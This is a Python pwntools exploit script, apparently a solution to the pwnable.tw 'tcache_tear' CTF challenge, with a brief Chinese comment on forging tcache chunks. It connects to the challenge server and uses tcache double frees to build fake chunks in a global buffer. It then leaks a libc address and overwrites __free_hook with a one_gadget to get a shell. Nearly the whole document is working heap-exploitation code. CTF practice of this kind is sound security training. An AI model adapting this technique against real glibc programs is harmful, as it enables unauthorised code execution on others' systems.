'''
libc.so.27
要伪造一个要被free到tcachebin的chunk，只需要在其后伪造一个header为p32(0)+p32(0xx1)的chunk
'''
from pwn import *
context.log_level='debug'
#p=process(['tcache_tear'],env={"LD_PRELOAD":"/home/heihei/libc.so.6"})
#p=process('./tcache_tear')
p=remote('chall.pwnable.tw',10207)
#raw_input()
p.recvuntil('Name:')
name='a'*(0x602088-0x602060+2)
p.send(name)
def malloc(size,data):
    p.recvuntil('choice :')
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Data:')
    p.send(data)
def free():
    p.recvuntil('choice :')
    p.sendline('2')
def show():
    p.recvuntil('choice :')
    p.sendline('3')
    p.recvuntil('Name :')
    #print(p.recvuntil('\x00')[:-1])
    return u64(p.recvuntil('\x00')[:-1].ljust(8,'\x00'))

#a fake chunk in 0x602478(dataptr) suitablesize
malloc(144,'aaa')
free() #0
free() #1
size=p64(0x21)
pre_size=p64(0)
payload=pre_size+size+'a'*0x10+p64(0x20)+p64(0x21)
malloc(144,p64(0x602470)) #tcachebins put the ptr2data
malloc(144,'hehe')
malloc(144,payload)

#
malloc(80,'aaa') #5

free() #2
free() #3

#yidaonane and fill the gap betw 0x602088 0x602060
offset=(0x602088-0x602060+2)-0x20
#a fake chunk 
#payload=p64(0x420)+'b'*40+p64(0x602060)
pre_size2=0x80
payload=p64(pre_size2)+p64(0x421)+p64(0x602038)+p64(0)+'b'*24+p64(0x602060)
malloc(80,p64(0x602050)) #tcachebins put the ptr2data
malloc(80,'hehe')
malloc(80,payload)

free() #4
leak_addr=show()
libc_base=leak_addr-0x3ebca0
print(hex(leak_addr))
print("libc_base:%x"%libc_base)
#'''
libc=ELF('/home/heihei/libc.so.6')
free_hook=libc_base+libc.symbols['__free_hook']
print("free_hook%x"%free_hook)
#change malloc_hook address
malloc(156,'aaa')
free() #5
free() #6
one_gadget=0x4f322+libc_base
payload=p64(one_gadget)
malloc(156,p64(free_hook)) 
malloc(156,'hehe')
malloc(156,payload)
free()

p.interactive()

